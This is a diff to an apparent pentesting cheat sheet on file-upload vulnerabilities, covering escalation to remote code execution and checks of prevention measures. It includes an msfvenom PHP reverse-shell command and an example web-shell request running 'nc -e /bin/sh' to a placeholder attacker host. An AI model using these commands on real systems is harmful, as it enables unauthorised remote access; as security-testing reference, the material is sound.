@@ -52,7 +52,7 @@
 ### 10. Escalate to RCE or Other Impacts
    - **Explanation**: If a file executes, use it for RCE (e.g., reverse shell via `msfvenom -p php/reverse_php`). Chain with LFI for further exploitation.
    - **Why It's Done**: Maximizes impact, turning upload into full system access.
-   - **Example**: Upload `shell.php`, access `/uploads/shell.php?cmd=nc -e /bin/sh attacker_ip 9001`.
+   - **Example**: Upload `shell.php`, access `/uploads/shell.php?cmd=nc -e /bin/sh attacker_ip 9001`, or use FTP (see [FTP Cheat Sheet](./ftp-cheat.md)) to upload via an open server.
 
 ### 11. Assess Prevention Measures
    - **Explanation**: Check for strong validation (whitelists, content checks), random file names, or non-executable upload directories.
